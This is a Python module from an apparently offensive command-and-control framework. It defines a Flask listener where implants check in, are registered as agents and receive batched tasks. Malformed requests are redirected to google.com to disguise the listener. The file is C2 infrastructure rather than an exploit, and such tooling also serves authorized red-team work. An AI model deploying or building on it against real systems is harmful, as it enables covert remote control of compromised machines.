import json

from connect.output import display
from connect.server.models import AgentModel, db, ImplantModel
from flask import redirect, request, jsonify


class HTTPListenerRoutes:

    def __init__(self, flask_app, task_manager):
        self.flask_app = flask_app
        self.task_manager = task_manager
        self.flask_app.add_url_rule('/<path:route>', 'check_in', self.check_in, methods=['POST'])

    def check_in(self, route):
        try:
            batch_response = json.loads(request.get_data())
        except json.decoder.JSONDecodeError:
            #data = request.get_data().decode('utf-8')
            #display(f'Failed to parse batch response as JSON:\n{data}', 'ERROR')
            return redirect("https://www.google.com")

        if isinstance(batch_response, dict):
            display('Retrieved implant authentication: ' + str(batch_response), 'INFORMATION')
            implant = ImplantModel.query.filter_by(key=batch_response['id']).first()
            if not implant:
                display(f'Failed to find implant with id {id}', 'ERROR')
                return redirect("https://www.google.com")
            agent = AgentModel(implant=implant)
            db.session.add(agent)
            db.session.commit()
            display(f'Created agent {agent.id} sending it to implant {implant.id}', 'INFORMATION')
            return str(agent.check_in_task_id)

        batch_request = self.task_manager.parse_batch_response(batch_response)
        return jsonify(batch_request)
